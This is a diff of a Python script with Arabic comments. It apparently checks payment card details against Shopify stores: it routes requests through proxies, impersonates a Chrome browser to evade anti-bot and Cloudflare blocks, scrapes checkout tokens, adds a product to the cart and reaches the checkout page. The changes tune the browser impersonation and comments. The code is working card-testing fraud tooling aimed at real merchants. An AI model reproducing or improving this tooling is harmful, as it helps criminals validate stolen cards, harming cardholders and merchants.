@@ -27,18 +27,16 @@ def safe_response(msg, price, gate):
     return {"Response": clean_msg, "Price": clean_price, "Gate": gate}
 
 def extract_hybrid_token(html_text):
-    """
-    الرادار المدمج: يستخدم طريقتي وطريقة ملفك لسحب أي توكن موجود
-    """
+    """الرادار المدمج: يسحب التوكن من النظام القديم والحديث"""
     from html import unescape
     
-    # 1. البحث عن التوكن التسلسلي الحديث (من ملفك neww.py)
+    # 1. من نظام Extensibility الحديث (session_token)
     meta_pattern = r'<meta\s+name="serialized-session-token"\s+content="([^"]+)"'
     meta_match = re.search(meta_pattern, html_text)
     if meta_match:
         return unescape(meta_match.group(1)).strip('"')
         
-    # 2. البحث في النظام القديم والـ JSON (طريقتنا القوية)
+    # 2. من النظام الكلاسيكي (authenticity_token)
     patterns = [
         r'name="authenticity_token"\s*value="([^"]+)"',
         r'value="([^"]+)"\s*name="authenticity_token"',
@@ -115,16 +113,15 @@ async def check_shopify_hybrid(cc_info, store_url, proxy):
         formatted_proxy = format_proxy(proxy)
         proxies = {"http": formatted_proxy, "https": formatted_proxy} if formatted_proxy else None
 
-        # استخدام Chrome 120 مع تفعيل Cookies تلقائية كما نفعل بالمتصفح
-        async with AsyncSession(impersonate="chrome120", proxies=proxies, timeout=60) as session:
+        # تم التصحيح هنا: العودة إلى chrome110 المدعوم والمستقر لتجنب الانهيار
+        async with AsyncSession(impersonate="chrome110", proxies=proxies, timeout=60) as session:
             
             # 1. سحب المنتج المتخفي
             variant_id, price = await get_robust_product(session, store_url)
             if not variant_id:
-                # محاولة فحص الموقع لنتأكد هل هو ميت أم كلاودفلير؟
                 chk = await session.get(store_url)
                 if chk.status_code in [403, 429]:
-                    return safe_response("Cloudflare blocked Proxy (Product Fetch)", "-", "Shopify Hybrid API")
+                    return safe_response("Cloudflare blocked Prx (Product Fetch)", "-", "Shopify Hybrid API")
                 return safe_response("No available products found", "-", "Shopify Hybrid API")
 
             # 2. الإضافة للسلة بهيدرز شرعية
@@ -135,7 +132,7 @@ async def check_shopify_hybrid(cc_info, store_url, proxy):
             if res2.status_code != 200: 
                 return safe_response("Cart Add Failed (Anti-Bot Active)", price, "Shopify Hybrid API")
 
-            # 3. الدخول لصفحة الدفع (طريقتنا القوية)
+            # 3. الدخول لصفحة الدفع
             checkout_url = f"{store_url}/checkout"
             res3 = await session.get(checkout_url, allow_redirects=True)
             checkout_html = res3.text
